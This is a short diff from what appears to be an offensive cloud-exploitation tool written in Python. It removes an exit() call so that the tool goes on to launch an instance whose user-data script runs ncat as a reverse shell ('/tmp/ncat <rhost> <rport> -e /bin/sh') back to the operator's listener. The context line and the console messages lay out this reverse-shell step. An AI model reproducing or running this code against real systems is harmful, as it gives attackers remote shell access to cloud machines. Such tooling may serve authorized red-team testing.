@@ -112,7 +112,6 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
         self.console.print(f"User data payload.. ([yellow]PREVIEW[/yellow])")
         self.console.print("-"*70+f"\n{_tmp_payload}\n"+"-"*70)
         self.console.print("Running instance with reverse shell user data script.. ([green]OK[/green])")
-        exit()
         self._run_instance(ami_id=ami_id, instance_type=instance_type, user_data=self.user_data_payload)
         self.console.print("\nCheck your TCP listener after a minute or two for a callback.. ([red]ACTION[/red])")
 
